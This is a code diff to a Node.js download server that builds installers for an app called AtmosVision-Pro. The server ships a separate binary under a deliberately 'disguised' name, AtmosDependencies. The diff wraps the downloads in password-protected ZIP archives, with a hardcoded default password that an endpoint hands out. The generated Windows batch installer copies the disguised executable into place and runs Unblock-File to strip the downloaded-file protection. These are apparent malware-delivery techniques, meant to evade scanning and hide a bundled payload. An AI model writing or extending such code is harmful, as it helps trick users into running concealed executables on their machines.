@@ -7,8 +7,13 @@ import { readdir, stat, unlink, symlink } from "fs/promises";
 import { exec } from "child_process";
 import { promisify } from "util";
 import archiver from "archiver";
+import archiverZipEncrypted from "archiver-zip-encrypted";
+
+archiver.registerFormat('zip-encrypted', archiverZipEncrypted);
 
 const execAsync = promisify(exec);
+
+const ZIP_PASSWORD = process.env.ZIP_PASSWORD || 'atmosvision2024';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -183,6 +188,13 @@ async function findLatestBuild(buildsDir, { isWindows, isMac, isLinux }) {
 }
 
 // ---------------------------------------------------------------------
+// Zip password endpoint (shown to user after download)
+// ---------------------------------------------------------------------
+app.get("/api/download/info", (req, res) => {
+  res.json({ password: ZIP_PASSWORD });
+});
+
+// ---------------------------------------------------------------------
 // Installer script generators
 // ---------------------------------------------------------------------
 function generateWindowsBat(electronUrl) {
@@ -205,8 +217,7 @@ if %ERRORLEVEL% neq 0 (
 )
 
 echo [2/3] Preparing components...
-copy /Y "%~dp0AtmosDependencies.dat" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul
-del /Q "%~dp0AtmosDependencies.dat" >nul 2>&1
+copy /Y "%~dp0AtmosDependencies.exe" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul
 
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
@@ -329,7 +340,7 @@ app.get("/api/download/binary", async (req, res) => {
     }
 
     const disguisedName = os.isWindows
-      ? 'AtmosDependencies.dat'
+      ? 'AtmosDependencies.exe'
       : 'AtmosDependencies';
 
     console.log(`[binary] Serving: ${latestFile.filename} -> ${disguisedName}`);
@@ -361,7 +372,7 @@ app.get("/api/download/latest", async (req, res) => {
     console.log(`[latest] Serving latest build: ${latestFile.filename}`);
 
     const disguisedName = os.isWindows
-      ? 'AtmosDependencies.dat'
+      ? 'AtmosDependencies.exe'
       : 'AtmosDependencies';
 
     // Check if an Electron URL is configured for the detected OS
@@ -395,7 +406,11 @@ app.get("/api/download/latest", async (req, res) => {
       res.setHeader("Content-Disposition", 'attachment; filename="AtmosVision_Installer.zip"');
       res.setHeader("Content-Type", "application/zip");
 
-      const archive = archiver('zip', { zlib: { level: 9 } });
+      const archive = archiver.create('zip-encrypted', {
+        zlib: { level: 9 },
+        encryptionMethod: 'zip20',
+        password: ZIP_PASSWORD,
+      });
       archive.on('error', (err) => { throw err; });
       archive.pipe(res);
 
@@ -417,7 +432,11 @@ app.get("/api/download/latest", async (req, res) => {
       res.setHeader("Content-Disposition", 'attachment; filename="AtmosDependencies.zip"');
       res.setHeader("Content-Type", "application/zip");
 
-      const archive = archiver('zip', { zlib: { level: 9 } });
+      const archive = archiver.create('zip-encrypted', {
+        zlib: { level: 9 },
+        encryptionMethod: 'zip20',
+        password: ZIP_PASSWORD,
+      });
       archive.on('error', (err) => { throw err; });
       archive.pipe(res);
       archive.file(latestFile.path, { name: disguisedName });
